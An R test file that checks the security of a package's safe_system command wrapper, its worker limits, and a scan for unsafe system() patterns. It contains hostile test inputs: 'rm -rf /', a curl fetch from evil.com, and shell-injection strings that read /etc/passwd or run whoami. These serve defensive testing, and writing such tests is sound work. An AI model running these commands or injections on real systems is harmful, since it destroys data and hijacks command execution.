test_that("safe_system validates command whitelist", {
  # Commands not in whitelist should fail
  expect_error(
    safe_system("rm", c("-rf", "/")),
    "Command not in whitelist: rm"
  )

  expect_error(
    safe_system("curl", c("https://evil.com/script.sh")),
    "Command not in whitelist: curl"
  )

  # Allowed commands should work (if installed)
  skip_if_not(Sys.which("docker") != "", "Docker not installed")
  expect_no_error(
    safe_system("docker", c("--version"))
  )
})

test_that("safe_system prevents command injection in arguments", {
  skip_if_not(Sys.which("docker") != "", "Docker not installed")

  # Malicious arguments with shell metacharacters should be safely escaped
  # This should NOT execute the injected command
  malicious_arg <- "test; echo 'INJECTED' > /tmp/starburst-injection-test"

  # safe_system should treat this as a literal argument, not execute the injection
  # Docker will fail on the malformed tag, but the injection won't run
  expect_error(
    safe_system("docker", c("build", "-t", malicious_arg, ".")),
    "failed"  # Docker will fail, not the injection executing
  )

  # Verify injection didn't run
  expect_false(file.exists("/tmp/starburst-injection-test"))

  # Try other shell metacharacters
  malicious_args <- c(
    "tag`rm -rf /tmp/test`",
    "tag$(whoami)",
    "tag&&echo hack",
    "tag||echo hack",
    "tag|cat /etc/passwd"
  )

  for (arg in malicious_args) {
    # All should fail safely (docker error, not shell execution)
    expect_error(
      safe_system("docker", c("images", arg)),
      # processx will fail because these aren't valid arguments
      # but won't execute shell commands
      NA  # Just expect an error, don't care about message
    )
  }
})

test_that("worker count validation enforced", {
  # Negative workers
  expect_error(
    validate_workers(-5),
    "positive number"
  )

  # Zero workers
  expect_error(
    validate_workers(0),
    "positive number"
  )

  # Too many workers
  expect_error(
    validate_workers(1000),
    "Workers must be <= 500"
  )

  expect_error(
    validate_workers(10000),
    "Workers must be <= 500"
  )

  # Valid worker counts should pass
  expect_silent(validate_workers(1))
  expect_silent(validate_workers(50))
  expect_silent(validate_workers(100))
  expect_silent(validate_workers(500))  # Exactly at limit
})

test_that("safe_system handles stdin securely", {
  skip("stdin test requires specific system configuration")

  # Note: The actual security of stdin handling is verified by:
  # 1. processx using proper escaping and no shell expansion
  # 2. Docker login tests which pass password via stdin
  # 3. Command injection tests which verify arguments are escaped

  # This test would verify stdin behavior but requires platform-specific
  # command availability that may not be present in all test environments
})

test_that("plan() respects worker limits", {
  skip_on_cran()
  skip_if_offline()

  # This should fail due to worker validation
  expect_error(
    plan(starburst, workers = 1000),
    "Workers must be <= 500"
  )

  # Valid plan should work (validation passes, might fail on other things)
  # We're just testing validation here
  expect_error(
    suppressMessages(validate_workers(100)),
    NA  # No error expected
  )
})

test_that("Docker commands use safe_system not shell commands", {
  # Read the utils.R file and check for unsafe patterns
  utils_content <- readLines(system.file("R", "utils.R", package = "starburst"))

  # Should NOT contain:
  # - system() with sprintf() building commands
  # - Shell redirection operators in Docker commands
  # - Unquoted variable interpolation in shell commands

  # Look for dangerous patterns
  dangerous_patterns <- c(
    'system\\(sprintf\\(',  # system(sprintf(...)) is dangerous
    'system\\("docker.*<',  # Shell redirection
    'system\\("docker.*\\|\\|',  # Shell OR
    'system\\("docker.*&&'  # Shell AND
  )

  for (pattern in dangerous_patterns) {
    matches <- grep(pattern, utils_content, value = TRUE)
    expect_equal(
      length(matches),
      0,
      info = sprintf("Found unsafe pattern '%s' in utils.R:\n%s",
                    pattern, paste(matches, collapse = "\n"))
    )
  }

  # Should contain safe_system calls
  expect_true(
    any(grepl('safe_system\\("docker"', utils_content)),
    info = "utils.R should use safe_system() for Docker commands"
  )
})
